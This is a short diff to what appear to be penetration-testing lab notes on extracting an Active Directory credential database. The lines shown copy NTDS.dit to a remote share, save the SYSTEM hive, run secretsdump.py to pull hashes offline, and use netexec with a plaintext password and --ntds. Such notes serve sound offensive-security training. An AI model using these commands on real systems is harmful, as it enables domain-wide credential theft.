@@ -15,6 +15,13 @@ Copy over to our machine
 cmd.exe /c move C:\ProgramData\NTDS.dit \\10.10.15.30\CompData 
 ```
 
+```powershell
+reg save hklm\system C:\Windows\system.bak
+```
+
+```powershell
+secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
+```
 ### Netexec 
 ```shell
 netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
